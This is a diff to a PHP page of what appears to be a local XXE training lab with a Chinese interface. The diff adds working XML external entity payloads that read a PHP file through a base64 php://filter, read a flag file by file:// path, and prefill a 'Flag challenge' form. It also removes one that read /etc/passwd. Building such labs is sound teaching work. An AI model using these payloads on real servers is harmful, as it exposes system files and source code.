@@ -84,7 +84,16 @@ $content = '<div class="card">
                     <h5 class="mb-2 mt-4">3. 读取PHP文件（base64编码）</h5>
                     <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE root [
-    &lt;!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=file_read.php"&gt;
+    &lt;!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=01_file_read.php"&gt;
+]&gt;
+&lt;root&gt;
+    &lt;name&gt;&amp;file;&lt;/name&gt;
+&lt;/root&gt;</code></pre>
+
+                    <h5 class="mb-2 mt-4">4. 读取Flag文件</h5>
+                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY file SYSTEM "file:///d:/phpstudy_pro/WWW/zhaosec/xxe/flag.txt"&gt;
 ]&gt;
 &lt;root&gt;
     &lt;name&gt;&amp;file;&lt;/name&gt;
@@ -102,7 +111,7 @@ $content = '<div class="card">
                             <label for="xml" class="form-label">XML内容</label>
                             <textarea name="xml" id="xml" class="form-control" rows="8" placeholder="输入XML内容">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE root [
-    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
+    &lt;!ENTITY file SYSTEM "file:///d:/phpstudy_pro/WWW/zhaosec/xxe/flag.txt"&gt;
 ]&gt;
 &lt;root&gt;
     &lt;name&gt;&amp;file;&lt;/name&gt;
@@ -110,6 +119,23 @@ $content = '<div class="card">
                         </div>
                         <button type="submit" class="btn btn-danger">提交</button>
                     </form>
+                    
+                    <div class="card mt-4">
+                        <div class="card-header">
+                            <h6>🎯 Flag挑战</h6>
+                        </div>
+                        <div class="card-body">
+                            <p class="mb-3">尝试读取服务器上的flag文件：</p>
+                            <form method="POST" class="mb-3">
+                                <div class="input-group">
+                                    <span class="input-group-text">Flag路径</span>
+                                    <input type="text" name="xml" class="form-control" value="&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///d:/phpstudy_pro/WWW/zhaosec/xxe/flag.txt\"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/root&gt;">
+                                    <button type="submit" class="btn btn-success">读取Flag</button>
+                                </div>
+                            </form>
+                            <p class="text-muted">提示：尝试使用不同的文件路径格式来读取flag文件</p>
+                        </div>
+                    </div>
 
                     ';
 
